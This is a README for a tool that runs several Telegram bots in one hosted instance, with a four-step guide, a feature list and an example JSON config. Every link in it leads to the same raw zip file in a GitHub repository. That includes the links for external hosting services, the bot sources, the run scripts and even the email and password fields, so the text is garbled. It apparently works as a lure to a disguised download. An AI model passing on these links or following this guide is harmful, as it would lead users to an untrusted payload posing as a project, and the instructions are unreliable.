# MultiBots

_Have you encountered the problem where you have to host less resource intense Telegram Bots for free and you can only host a bot for an account but you wanted to host all bots in one instance, well say no more..._

_You can run multiple bots in a same instance, for now it only works for pure python bots (no docker support yet) but you need to host this on services which provide Docker support._

---

## Guide

1. *Fork this repositary*
2. *Edit https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip to your liking*
3. *Host that repositary*
4. *Profit*

---

## Features

* **Stay Updated** since it clones from GitHub.
* **Extend** you can extend this to any number of bots by just adding more objects (see [Example](#example) below) although i recommend not to exceed 5 for 500 MB memory.
* **ENVs** you can set different ENV values for different bots even with same name.
* **Control** you can also set script file from where execution starts for that bot.
* **Private** you can also clone private repositories with help of Tokens. (see [Example](#example) below)
* **Web App** uses Flask to connect to service, so that it can be hosted as Dynamic Web Apps which is required for services like [render](https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip), [scalingo](https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip) etc.

---

## Example

```
{   
    "Ebook": {
        "source": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
        "env": {
            "TOKEN": "xxx",
            "ID": "111",
            "HASH": "yyy",
            "REMIX_ID": "123",
            "REMIX_KEY": "abc123",
            "IA_EMAIL": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
            "IA_PASS": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
        },
        "run": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
    },
    "Link": {
        "source": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
        "env": {
            "TOKEN": "fff",
            "ID": "222",
            "HASH": "123abc"
        },
        "run": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
    },
    "Private": {
        "source": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
        "env": {
            "TOKEN": "yyy",
            "ID": "444",
            "HASH": "abc321"
        },
        "run": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
    }
}
```